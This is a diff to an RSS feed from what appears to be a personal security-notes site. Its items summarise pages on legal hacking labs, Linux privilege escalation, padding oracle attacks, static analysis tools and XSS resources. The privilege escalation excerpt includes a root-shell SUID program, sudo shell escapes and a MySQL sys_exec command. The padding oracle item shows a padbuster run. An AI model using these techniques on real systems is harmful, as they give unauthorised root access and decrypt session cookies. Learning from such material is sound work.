@@ -20,6 +20,25 @@
     </item>
     
     <item>
+      <title>Hacking Learning Platforms</title>
+      <link>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</guid>
+      <description> Things you can hack for (free) &amp;amp; legally
+Online Labs  Hack The Box
+ Hacking Lab
+ Pwnable.KR
+ Root-Me
+ Practical Pentest Labs
+ Rozwal.To
+  Vulnerable Applications To Deploy Yourself] OWASP Juice Shop
+Miscellaneous  Mind Map - lots of links
+ List of Hacking - source: https://www.blackroomsec.com/updated-hacking-challenge-site-links/
+  </description>
+    </item>
+    
+    <item>
       <title>Linux Privilege Escalation</title>
       <link>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -27,6 +46,58 @@
       <guid>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</guid>
       <description>MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command.
 select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them find / -user root -perm -4000 -print 2&amp;gt;/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt; int main() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c &amp;#34;import pty; pty.</description>
+    </item>
+    
+    <item>
+      <title>Padding Oracle Attack</title>
+      <link>https://d47zm3.me/resources/infosec/padding-oracle-attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/padding-oracle-attack/</guid>
+      <description>Performing Padding Oracle Attack using padBuster.
+Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &amp;#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&amp;#34; 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.</description>
+    </item>
+    
+    <item>
+      <title>Personal Security Checklist</title>
+      <link>https://d47zm3.me/resources/infosec/personal-security-checklist/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/personal-security-checklist/</guid>
+      <description>Be safe on the internet - An open source checklist of resources designed to improve your online privacy and security. Check things off to keep track as you go.</description>
+    </item>
+    
+    <item>
+      <title>Static Code Analysis</title>
+      <link>https://d47zm3.me/resources/infosec/static-code-analysis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/static-code-analysis/</guid>
+      <description> Performing static code analysis in order to find weak points.
+Articles  great article from @bl4de on that subject
+ another article from AppSecco
+  Tools  relative-url-extractor
+ waybackurls
+ trufflehog
+ eslint + security rules (node for example or angular)
+ linkfinder
+ nodejsscan
+ retire.js
+ awesome-static-analysis
+  </description>
+    </item>
+    
+    <item>
+      <title>XSS</title>
+      <link>https://d47zm3.me/resources/infosec/xss/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/xss/</guid>
+      <description>Everything related to XSS, tools, links, payloads, etc.
+Tools  ezXSS - self hosted dashboard and server for your payloads
+ bXSS - blind XSS application, had not played with it yet
+  Sites  XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc.
+ XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.</description>
     </item>
     
   </channel>
